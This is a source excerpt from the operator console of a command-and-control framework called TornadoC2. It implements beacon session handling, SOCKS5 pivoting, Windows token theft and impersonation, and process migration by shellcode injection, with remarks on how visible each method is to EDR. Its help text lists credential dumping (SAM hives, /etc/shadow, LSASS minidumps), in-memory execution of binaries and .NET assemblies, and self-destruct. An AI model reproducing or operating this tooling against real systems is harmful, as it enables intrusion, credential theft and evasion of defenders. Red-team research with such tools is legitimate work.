<h2>Task history</h2>
{history}

<h2>Session log</h2>
<pre class="log">{log_html}</pre>

<footer class="footer">
  <p>Beacon session <code>#{session.id}</code> &middot;
     fingerprint <code>{esc(session.fingerprint)}</code></p>
  <p>Generated by TornadoC2. Self-contained report &mdash;
     no external resources.</p>
</footer>

</div>
</body>
</html>
"""

        try:
            with open(out_path, 'w', encoding='utf-8') as fh:
                fh.write(page)
        except OSError as exc:
            print(f"{self.c['red']}Export failed: {exc}"
                  f"{self.c['end']}")
            return

        size = _os.path.getsize(out_path)
        print(f"{self.c['green']}Exported #{session.id} to "
              f"{out_path} ({size} bytes){self.c['end']}")

    # ------------------------------------------------------------------
    # SOCKS5 pivoting

    def _cmd_socks(self, session, parts) -> None:
        """SOCKS5 pivoting.

            socks start <local_port>   start a SOCKS5 proxy for this beacon
            socks stop                 stop the proxy for this beacon
            socks status               show the proxy state
            socks                      same as `socks status`
        """
        c = self.c
        if self.engine.pivot is None:
            print(f"{c['red']}Pivot manager not available. The "
                  f"handler did not start the pivot listener."
                  f"{c['end']}")
            return

        if len(parts) < 2 or parts[1].lower() in ('status', 'info'):
            proxies = self.engine.pivot.list_proxies()
            mine = [p for p in proxies if p.beacon_id == session.id]
            if not mine:
                print(f"{c['yellow']}No SOCKS5 proxy running for "
                      f"beacon #{session.id}{c['end']}")
            else:
                p = mine[0]
                print(f"{c['cyan']}SOCKS5 proxy for beacon "
                      f"#{session.id} on 127.0.0.1:{p.local_port}"
                      f"{c['end']}")
            return

        if parts[1].lower() == 'start':
            if len(parts) < 3:
                print(f"{c['red']}Usage: socks start <local_port>"
                      f"{c['end']}")
                return
            try:
                local_port = int(parts[2])
            except ValueError:
                print(f"{c['red']}Invalid port{c['end']}")
                return
            if not (1 <= local_port <= 65535):
                print(f"{c['red']}Port out of range{c['end']}")
                return

            if session.sleep_interval > 0:
                print(f"{c['yellow']}[tip] beacon sleep is "
                      f"{session.sleep_interval}s — SOCKS5 will not "
                      f"work reliably at this interval. Run `sleep 0` "
                      f"first.{c['end']}")
            proxy = self.engine.pivot.start_proxy(
                session.id, local_port)
            if proxy is None:
                print(f"{c['red']}Could not bind 127.0.0.1:"
                      f"{local_port} (already in use, or a proxy is "
                      f"already running for this beacon){c['end']}")
                return
            print(f"{c['green']}SOCKS5 proxy listening on "
                  f"127.0.0.1:{local_port} for beacon #{session.id}"
                  f"{c['end']}")
            return

        if parts[1].lower() == 'stop':
            ok = self.engine.pivot.stop_proxy(session.id)
            if ok:
                print(f"{c['green']}SOCKS5 proxy stopped{c['end']}")
            else:
                print(f"{c['yellow']}No proxy was running for this "
                      f"beacon{c['end']}")
            return

        print(f"{c['red']}Unknown socks subcommand: {parts[1]}"
              f"{c['end']}")


    def _cmd_steal_token(self, session, parts) -> None:
        """Windows token theft and impersonation.

            steal_token list [user]      enumerate processes with owners
            steal_token impersonate <pid>   steal the token and hold it
            steal_token whoami           show the held token's identity
            steal_token revert           drop the held token

        Requires the agent to be running as Administrator or SYSTEM.
        After `impersonate`, every `exec` in this session runs as the
        stolen user until `revert` is issued.
        """
        c = self.c
        if session.identity.get('os') != 'windows':
            print(f"{c['red']}steal_token is Windows-only. This "
                  f"session is {session.identity.get('os','?')}"
                  f"{c['end']}")
            return

        if len(parts) < 2:
            print(f"{c['red']}Usage: steal_token "
                  f"<list|impersonate|whoami|revert>{c['end']}")
            return

        sub = parts[1].lower()
        if sub == 'list':
            args = ['steal_token', 'list']
            if len(parts) > 2:
                args.append(parts[2])
            self._dispatch(session, args,
                           blocking=True, task_timeout=120,
                           wait_timeout=140)
            return

        if sub == 'impersonate':
            if len(parts) < 3:
                print(f"{c['red']}Usage: steal_token impersonate <pid>"
                      f"{c['end']}")
                return
            self._dispatch(session, ['steal_token', 'impersonate',
                                     parts[2]],
                           blocking=True, task_timeout=60,
                           wait_timeout=80)
            return

        if sub == 'whoami':
            self._dispatch(session, ['steal_token', 'whoami'],
                           blocking=True, task_timeout=30,
                           wait_timeout=50)
            return

        if sub == 'revert':
            self._dispatch(session, ['steal_token', 'revert'],
                           blocking=True, task_timeout=30,
                           wait_timeout=50)
            return

        print(f"{c['red']}Unknown steal_token subcommand: {sub}"
              f"{c['end']}")

    def _cmd_migrate(self, session, parts) -> None:
        """Move the beacon's execution into a new process.

            migrate --self                       detach a copy and exit
            migrate <pid> [--method <name>]      inject into a PID
            migrate <name> [--method <name>]     resolve basename, inject

        --method default  — CreateRemoteThread (Windows) or ptrace
                            (Linux). The historical path; highest
                            fidelity, highest signal.
        --method apc      — remote APC injection on Windows. Queues
                            the shellcode to the target's existing
                            threads through NtQueueApcThread. No new
                            thread, no CreateRemoteThread event. The
                            technique is instrumented; it is a signal
                            change, not a signal removal.

        When --method is omitted, the build-time default is used. The
        agent itself validates --method, refuses `--self --method`, and
        refuses apc on non-Windows targets. The console passes the
        argument list through unchanged.
        """
        c = self.c

        if len(parts) < 2:
            print(f"{c['red']}Usage: migrate --self | <pid> | "
                  f"<process-name> [--method default|apc]"
                  f"{c['end']}")
            return

        target = parts[1]

        if target in ('--self', 'self'):
            if '--method' in parts[2:]:
                print(f"{c['red']}migrate --self does not accept "
                      f"--method; the detached-spawn path is the "
                      f"only self-migration form.{c['end']}")
                return
            # --self has no destruction risk of its own: the parent
            # deletes itself after the child signals ready, and the
            # session survives. No confirmation prompt.
            self._dispatch(session, ['migrate'] + list(parts[1:]),
                           blocking=True,
                           task_timeout=60, wait_timeout=80)
            return

        # Foreign-process injection. Confirm before queuing — the
        # action is a one-shot into a running process and the
        # --method apc path in particular leaves the shellcode
        # mapped in the target until the target exits.
        print()
        print(f"  {c['yellow']}migrate will inject the agent's "
              f"embedded shellcode into the target process."
              f"{c['end']}")
        print(f"  {c['dim']}The parent beacon unlinks its own "
              f"on-disk binary five seconds after a successful "
              f"injection. The session survives on the new process "
              f"with the same beacon ID.{c['end']}")

        method_hint = ''
        for i, arg in enumerate(parts[2:]):
            if arg == '--method' and i + 3 < len(parts) + 1:
                method_hint = parts[3 + i] if 3 + i < len(parts) else ''
                break
            if arg.startswith('--method='):
                method_hint = arg.split('=', 1)[1]
                break
        if method_hint == 'apc':
            print(f"  {c['dim']}Method: apc — the shellcode is "
                  f"queued to the target's threads and runs on the "
                  f"first alertable wait. NtQueueApcThread is "
                  f"instrumented by every major EDR vendor."
                  f"{c['end']}")
        elif method_hint in ('default', ''):
            print(f"  {c['dim']}Method: default — CreateRemoteThread "
                  f"on Windows, ptrace on Linux. The historical "
                  f"path; highest signal.{c['end']}")

        try:
            ans = input(
                f"  {c['green']}proceed? [y/N]{c['end']} "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            print(f"{c['dim']}cancelled{c['end']}")
            return
        if ans not in ('y', 'yes'):
            print(f"{c['dim']}cancelled{c['end']}")
            return

        self._dispatch(session, ['migrate'] + list(parts[1:]),
                       blocking=True,
                       task_timeout=180, wait_timeout=200)

    # ------------------------------------------------------------------
    # Extensions

    def _extension_dir(self):
        here = _os.path.dirname(_os.path.abspath(__file__))
        pkg_root = _os.path.dirname(here)
        return _os.path.join(pkg_root, 'extensions')

    def _load_extension_manifest(self, path):
        import json as _json
        if _os.path.isdir(path):
            manifest_path = _os.path.join(path, 'extension.json')
        else:
            manifest_path = path
        if not _os.path.isfile(manifest_path):
            return None
        try:
            with open(manifest_path, 'r', encoding='utf-8') as fh:
                spec = _json.load(fh)
        except Exception:
            return None
        if not isinstance(spec, dict) or not spec.get('name'):
            return None
        spec['_dir'] = _os.path.dirname(manifest_path)
        return spec

    def _list_local_extensions(self):
        out = {}
        d = self._extension_dir()
        if not _os.path.isdir(d):
            return out
        for entry in sorted(_os.listdir(d)):
            full = _os.path.join(d, entry)
            if not _os.path.isdir(full):
                continue
            spec = self._load_extension_manifest(full)
            if spec:
                out[spec['name']] = spec
        return out

    def _cmd_extension_list(self):
        ext = self._list_local_extensions()
        if not ext:
            print(f"{self.c['yellow']}No extensions in "
                  f"{self._extension_dir()}{self.c['end']}")
            return
        print(f"{self.c['cyan']}Extensions ({len(ext)}):"
              f"{self.c['end']}")
        for name in sorted(ext):
            spec = ext[name]
            print(f"  {self.c['green']}{name:<16}{self.c['end']} "
                  f"v{spec.get('version', '?'):<8} "
                  f"{spec.get('description', '')}")

    def _cmd_extension_info(self, name):
        ext = self._list_local_extensions()
        spec = ext.get(name)
        if spec is None:
            print(f"{self.c['red']}Unknown extension: {name}"
                  f"{self.c['end']}")
            return
        for k in sorted(k for k in spec if not k.startswith('_')):
            v = spec[k]
            if isinstance(v, list):
                v = ', '.join(str(x) for x in v)
            print(f"  {k:<14}: {v}")

    def _cmd_extension_load(self, session, name_or_path):
        import base64 as _b64

        if _os.path.isdir(name_or_path):
            spec = self._load_extension_manifest(name_or_path)
        elif _os.path.isfile(name_or_path):
            spec = self._load_extension_manifest(name_or_path)
        else:
            ext = self._list_local_extensions()
            spec = ext.get(name_or_path)
        if spec is None:
            print(f"{self.c['red']}Extension not found: {name_or_path}"
                  f"{self.c['end']}")
            return

        name = spec['name']
        if name in self.NATIVE_VERBS:
            print(f"{self.c['red']}Refusing to load: '{name}' collides "
                  f"with a native agent verb. Rename the extension."
                  f"{self.c['end']}")
            return

        binary_rel = spec.get('binary', f"{name}.wasm")
        binary_path = _os.path.join(spec['_dir'], binary_rel)
        if not _os.path.isfile(binary_path):
            print(f"{self.c['red']}Binary missing: {binary_path}"
                  f"{self.c['end']}")
            return

        with open(binary_path, 'rb') as fh:
            blob = fh.read()
        b64 = _b64.b64encode(blob).decode('ascii')
        print(f"{self.c['cyan']}[*] Loading {name} "
              f"({len(blob)} bytes, {len(b64)} on the wire)"
              f"{self.c['end']}")
        self._dispatch(session, ['extension_register', name, b64],
                       blocking=True, task_timeout=180, wait_timeout=200)

    def _cmd_extension_call(self, session, name, args):
        self._dispatch(session, ['extension_call', name] + list(args),
                       blocking=True, task_timeout=180, wait_timeout=200)

    def _cmd_extension_unload(self, session, name):
        self._dispatch(session, ['extension_unload', name],
                       blocking=True, task_timeout=30, wait_timeout=60)

    def _cmd_extension_list_loaded(self, session):
        self._dispatch(session, ['extension_list'],
                       blocking=True, task_timeout=30, wait_timeout=60)

    # ------------------------------------------------------------------
    # Formatting

    def _print_banner(self, session) -> None:
        c = self.c
        print(f"\n{c['cyan']}{'='*70}{c['end']}")
        print(f"{c['green']}BEACON #{session.id}: "
              f"{session.display_name}{c['end']}")
        print(f"  fingerprint : {session.fingerprint}")
        print(f"  first seen  : "
              f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(session.first_seen))}")
        print(f"  sleep       : {session.sleep_interval}s "
              f"(jitter {session.jitter:.2f})")
        if session.kill_deadline:
            kill_str = time.strftime(
                '%Y-%m-%d %H:%M:%S',
                time.localtime(session.kill_deadline))
        else:
            kill_str = 'none'
        print(f"  kill date   : {kill_str}")
        print(f"{c['cyan']}{'='*70}{c['end']}")
        print(f"{c['yellow']}type 'help' for command list, "
              f"'exit' to detach{c['end']}\n")

    def _print_info(self, session) -> None:
        print(f"{self.c['cyan']}Beacon #{session.id} identity"
              f"{self.c['end']}")
        for k in sorted(session.identity):
            print(f"  {k:<12}: {session.identity[k]}")

    def _print_help(self) -> None:
        c = self.c
        print(f"""
    {c['green']}NATIVE — INSPECTION (no subprocess){c['end']}
    ls [path]                 Directory listing
    cat <path>                File read
    find <path> [flags]       Recursive search — -name, -size, -mtime, -type
    grep <pat> <path> [flags] Content search — -r, -i, -l
    head <file> [-n N]        First N lines (default 20)
    tail <file> [-n N]        Last N lines (default 20)
    stat <path>               File metadata
    strings <file> [-n N]     Printable string extraction (default min 4)
    hexdump <file> [-n N] [-o offset]  Hex + ASCII dump
    sha1 / sha256 / md5 <file>  Hashes
    cksum <file>              CRC-32 + byte count
    wc <file>                 Line / word / byte count
    nl <file>                 Number non-empty lines
    rev <file>                Reverse each line
    sort [-n] [-r] <file>     Sort lines
    uniq <file>               Collapse adjacent duplicate lines
    tr <set1> <set2> <file>   Translate bytes; tr -d <set> deletes
    base64 [-e|-d] [-s] <x>   Base64 encode or decode
    readlink <path>           Resolve symlink (Linux)
    realpath <path>           Canonical absolute path
    du <path>                 Directory size
    which <cmd>               Resolve cmd against PATH

    {c['green']}NATIVE — SYSTEM (no subprocess){c['end']}
    ps / id / env             Process, identity, environment
    pwd / whoami [/priv] / hostname / uname
                              (whoami /priv: token privileges, Windows)
    df [path]                 Disk usage
    uptime / date             Uptime; local and UTC time
    getpid / getppid          Beacon's PID / parent PID
    ifconfig                  Network interfaces + addresses
    netstat                   Listeners and established sockets
    arp                       ARP cache
    route                     Kernel routing table
    users / groups            Local users / groups
    av-list                   Installed security products
    screenshot                Interactive desktop capture (Windows)

    {c['green']}NATIVE — FILE OPS{c['end']}
    mkdir <path>              Create directory tree
    rm [-r] <path>            Remove file / tree
    cp <src> <dst>            Copy file
    mv <src> <dst>            Move / rename
    chmod <octal> <path>      Change mode (Linux)
    ln [-s] <target> <link>   Create symlink (Linux)
    touch [-r <ref>] <path>   Create file, or copy a reference mtime
    gzip <file>               Compress to <file>.gz
    gunzip <file.gz>          Decompress to <file>

    {c['green']}NATIVE — NETWORK (no curl / dig / nc child){c['end']}
    curl <url> [flags]        HTTP request
    resolve <host> [type]     DNS lookup
    nc <host> <port>          TCP reachability

    {c['green']}CREDENTIAL COLLECTION{c['end']}
    hashdump [<outdir>]       Windows: SAM + SYSTEM hives.
                              Linux: /etc/passwd + /etc/shadow merged
                              into unshadow(8) format.
    enablepriv <args>         List / enable / disable Windows token
                              privileges on the current process.
                              --list | --list-all | --vuln |
                              <privilege> [--disable] |
                              --all [--disable]
    lsassdump --dump [flags]  LSASS minidump. The highest-signal
                              verb in the framework — see
                              README.md › LSASS minidump.
                              --fork | --duplicate | --elevate |
                              --out <path>

    {c['green']}PROCESS MIGRATION{c['end']}
    migrate --self            Detach a copy of the on-disk binary
                              and exit. The session survives on
                              the child; no injection, no target
                              process involved.
    migrate <pid> [--method default|apc]
    migrate <name> [--method default|apc]
                              Inject the agent's embedded shellcode
                              into a foreign process. Requires a
                              build with `"inject": true`.
                              default: CreateRemoteThread (Windows)
                                       or ptrace (Linux)
                              apc:     remote APC injection, Windows
                                       only. No new thread; NtQueueApcThread
                                       is instrumented but lower-signal
                                       than CreateRemoteThread.
                              Without --method, the build-time
                              default is used.

    {c['green']}EXECUTION{c['end']}
    <cmd> [args...]           Run via shell; command hidden from argv
    exec <cmd> [args...]      Direct spawn; command visible in argv
    make_token <user> <pass>  Build a NEW_CREDENTIALS token (Windows).
                              Accepts DOMAIN\\user, user@domain, or
                              bare user. Subsequent `exec` runs as
                              that user; `rev2self` drops it.
    rev2self                  Drop the held impersonation token
    runas <user> <pass> <cmd> Spawn a child in a new logon session
                              as that user (Windows). Returns the
                              PID; does not wait.

    {c['green']}IN-MEMORY SCRIPTS{c['end']}
    pyexec <local.py> [-- args]    Python source via stdin
    psexec <local.ps1> [-- args]   PowerShell source via stdin (Windows)
    shexec <local.sh> [-- args]    Shell source via stdin

    {c['green']}FILE TRANSFER & IN-MEMORY EXECUTION{c['end']}
    upload <local> <remote>        Chunked upload with SHA-256 verify
    download <remote> <local>      Chunked download with SHA-256 verify
    execmem <remote> exe [-- args] Execute a PE in memory (Windows)
    execmem <remote> elf [-- args] Execute an ELF in memory (Linux)

    {c['green']}BEACON OBJECT FILES & .NET (Windows){c['end']}
    bof <name> [args...]           Run a registered BOF by name
    bof <path.o> [args...]         Run a local .o / .obj directly
    bof-list                       List BOFs from the shell handler's
                                   registry (logs/.tornadoc2_bofs.json)
    execute-assembly <path> [-- args]
                                   Run a .NET assembly in memory via
                                   Donut. Requires the Donut binary
                                   on PATH on the server.

    {c['green']}WASM EXTENSIONS{c['end']}
    extension list                 List extensions in the operator-side
                                   store (extensions/<name>/extension.json)
    extension info <name>          Show an extension's manifest
    extension load <path.wasm>     Push a local .wasm to the agent and
                                   register it under its file stem
    extension list-loaded          List extensions the agent holds in
                                   memory
    extension call <name> [args]   Run a loaded extension
    extension unload <name>        Close and drop a loaded extension
    <name> [args...]               Bare-name shorthand for extension call
                                   when <name> matches a loaded extension

    Extensions execute inside the agent's wazero interpreter — no
    disk artefact, no executable page, no syscall reachable from
    the module. See AI.md for the host ABI.

    SCHEDULING
    sleep <seconds> [jitter]  Change check-in interval
    workhours <start> <end>   Set working-hours window (HH:MM each)
    workhours off             Disable the working-hours gate
    workhours                 Show current window
    tasks                     List outstanding tasks
    wait [task-id]            Block until pending task(s) complete
    schedule add <N><u> <verb> [args]
                              Recurring server-side task (u: s/m/h/d)
    schedule list             List schedules for this beacon
    schedule remove <id>      Delete a schedule
    kill                      Queue self-destruct

    {c['green']}SOCKS5 PIVOTING{c['end']}
    socks start <port>        Start a SOCKS5 proxy for this beacon
    socks stop                Stop the proxy for this beacon
    socks status              Show the proxy state

    {c['green']}TOKEN IMPERSONATION (Windows){c['end']}
    steal_token list [user]   Enumerate processes with their owners
    steal_token impersonate <pid>  Steal a process token and hold it
    steal_token whoami        Show the held token's identity
    steal_token revert        Drop the held token

    {c['green']}NOTE{c['end']}
    Commands queue and return immediately; results print as they
    arrive. `wait` blocks until pending output has been shown.

    {c['green']}SESSION{c['end']}
    info                      Show beacon identity
    graph                     Engagement-wide session graph
    export [path]             Export session to HTML transcript
    forget / rm / remove      Delete this beacon session entirely
    exit / detach             Return to main menu
""")

    def _prompt(self, session) -> str:
        c = self.c
        dot = f"{c['green']}●{c['end']}" if session.alive \
              else f"{c['red']}○{c['end']}"
        return f"\r{dot} {c['cyan']}beacon#{session.id}{c['end']} > "